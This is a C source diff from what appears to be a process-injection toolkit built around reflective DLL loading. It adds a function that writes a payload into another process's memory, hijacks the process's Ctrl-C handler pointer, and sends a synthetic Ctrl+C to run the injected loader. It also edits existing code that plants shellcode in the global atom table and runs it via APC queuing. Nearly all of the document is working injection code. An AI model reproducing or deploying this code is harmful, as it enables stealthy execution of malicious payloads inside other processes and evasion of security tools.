@@ -1,4 +1,5 @@
 #include "LoadLibraryR.h"
+#include <psapi.h>
 #include <stdio.h>
 
 extern DWORD dwLength;
@@ -162,28 +163,29 @@ void WINAPI LoadRemoteLibraryR3(int payload_type, HANDLE hProcess, DWORD tid)
 		target_payload = VirtualAllocEx(hProcess, NULL, buflen, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); //MEM_COMMIT guarantees 0's.
 		if (target_payload == NULL)
 			return;
-		
+
 
 		ATOM b = GlobalAddAtomA("b"); // arbitrary one char string
 		if (b == 0)
-			return;
+			return ;
 
 		if (payload[0] == '\0')
-			return;
+			return ;
 
-		for (DWORD64 pos = buflen - 1; pos > 0; pos--)
+		for (DWORD64 pos = buflen- 1; pos > 0; pos--)
 		{
 			if ((payload[pos] == '\0') && (payload[pos - 1] == '\0'))
 			{
 				(*pNtQueueApcThread)(th, GlobalGetAtomNameA, (PVOID)b, (PVOID)(((DWORD64)target_payload) + pos - 1), (PVOID)2);
 			}
 		}
+
 		for (char* pos = payload; pos < (payload + buflen); pos += strlen(pos) + 1)
 		{
 			if (*pos == '\0')
 				continue;
 
-			ATOM a = GlobalAddAtomA(pos); // 
+			ATOM a = GlobalAddAtomA(pos); // 아톰 테이블에 쉘코드 추가
 			if (a == 0)
 				return ;
 
@@ -209,7 +211,7 @@ void WINAPI LoadRemoteLibraryR4(int payload_type, HANDLE hProcess, DWORD tid)
 	HANDLE tp;
 	LPVOID lpRemoteLibraryBuffer = NULL;
 	LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
-	DWORD dwThreadId = 0;
+
 
 	set_param(payload_type);
 
@@ -275,7 +277,6 @@ void WINAPI LoadRemoteLibraryR5(int payload_type)
 
 	LPVOID lpRemoteLibraryBuffer = NULL;
 	LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
-	DWORD dwThreadId = 0;
 	DWORD process_id;
 
 	set_param(payload_type);
@@ -444,4 +445,109 @@ DWORD GetReflectiveLoaderOffset(VOID* lpReflectiveDllBuffer, const char* exporte
 	}
 
 	return 0;
+}
+
+
+void WINAPI LoadRemoteLibraryR6(int payload_type, HANDLE hProcess)
+{
+
+	LPVOID lpRemoteLibraryBuffer = NULL;
+	LPVOID lpReflectiveLoader = NULL;
+
+	DWORD process_list[1];
+	DWORD parent_id;
+	void* encoded_addr = NULL;
+	INPUT ip;
+	MODULEINFO modinfo;
+	int size;
+	HWND hWindow;
+
+	DWORD pid = GetProcessId(hProcess);
+	set_param(payload_type);
+
+	try
+	{
+
+		// alloc memory (RWX) in the host process for the image
+		lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, buflen, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+		if (!lpRemoteLibraryBuffer)
+			return ;
+
+		// write the image into the host process
+		if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, buf, buflen, NULL))
+		{
+			return ;
+		}
+
+
+		// add the offset to ReflectiveLoader() to the remote library address
+		lpReflectiveLoader = (LPVOID)((ULONG_PTR)lpRemoteLibraryBuffer + offset);
+
+
+
+
+
+		NTSTATUS(*PRtlEncodeRemotePointer)(
+			_In_ HANDLE ProcessHandle,
+			_In_ PVOID Pointer,
+			_Out_ PVOID * EncodedPointer
+			) = (NTSTATUS(*)(
+				_In_ HANDLE ProcessHandle,
+				_In_ PVOID Pointer,
+				_Out_ PVOID * EncodedPointer
+				)) GetProcAddress(GetModuleHandleA("ntdll"), "RtlEncodeRemotePointer");
+
+		HMODULE kernelbase = GetModuleHandleA("kernelbase");
+		GetModuleInformation(GetCurrentProcess(), kernelbase, &modinfo, sizeof(modinfo));
+		size = modinfo.SizeOfImage;
+		char* kernelbase_DefaultHandler = (char*)memmem(kernelbase, size, "\x48\x83\xec\x28\xb9\x3a\x01\x00\xc0", 9); // sub rsp,28h; mov ecx,0C000013Ah (STATUS_CONTROL_C_EXIT)
+		__int64 encoded = (__int64)EncodePointer(kernelbase_DefaultHandler);
+		char* kernelbase_SingleHandler = (char*)memmem(kernelbase, size, &encoded, 8);
+
+		GetConsoleProcessList(process_list, 1);
+
+
+		parent_id = process_list[0];
+
+		FreeConsole();
+		AttachConsole(pid);
+		hWindow = GetConsoleWindow();
+		FreeConsole();
+		AttachConsole(parent_id);
+
+		(*PRtlEncodeRemotePointer)(hProcess, lpReflectiveLoader, &encoded_addr);
+		WriteProcessMemory(hProcess, kernelbase_SingleHandler, &encoded_addr, 8, NULL);
+
+		ip.type = INPUT_KEYBOARD;
+		ip.ki.wScan = 0;
+		ip.ki.time = 0;
+		ip.ki.dwExtraInfo = 0;
+		ip.ki.wVk = VK_CONTROL;
+		ip.ki.dwFlags = 0; // 0 for key press
+		SendInput(1, &ip, sizeof(INPUT));
+		Sleep(100);
+		PostMessageA(hWindow, WM_KEYDOWN, 'C', 0);
+
+		// release the Ctrl key
+		Sleep(100);
+		ip.type = INPUT_KEYBOARD;
+		ip.ki.wScan = 0;
+		ip.ki.time = 0;
+		ip.ki.dwExtraInfo = 0;
+		ip.ki.wVk = VK_CONTROL;
+		ip.ki.dwFlags = KEYEVENTF_KEYUP;
+		SendInput(1, &ip, sizeof(INPUT));
+
+		// Restore the original Ctrl handler in the target process
+		(*PRtlEncodeRemotePointer)(hProcess, kernelbase_DefaultHandler, &encoded_addr);
+		WriteProcessMemory(hProcess, kernelbase_SingleHandler, &encoded_addr, 8, NULL);
+
+
+	}
+	catch (...)
+	{
+		
+	}
+
+	return ;
 }
